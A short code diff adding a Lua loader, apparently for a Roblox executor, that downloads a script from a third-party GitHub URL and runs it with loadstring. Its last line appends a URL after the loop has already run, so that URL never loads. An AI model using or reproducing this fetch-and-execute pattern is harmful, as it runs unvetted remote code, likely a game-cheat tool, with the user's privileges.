@@ -1,0 +1,15 @@
+-- List of scripts to load
+local scripts = {
+    'https://raw.githubusercontent.com/1337kat/bahasf/refs/heads/main/skip%20loader',
+}
+
+-- Function to create and resume a coroutine for each script
+for _, url in ipairs(scripts) do
+    local thread = coroutine.create(function()
+        loadstring(game:HttpGet(url, true))()
+    end)
+    coroutine.resume(thread)
+end
+
+-- Add a new script by appending to the 'scripts' table
+table.insert(scripts, "new_script_url")
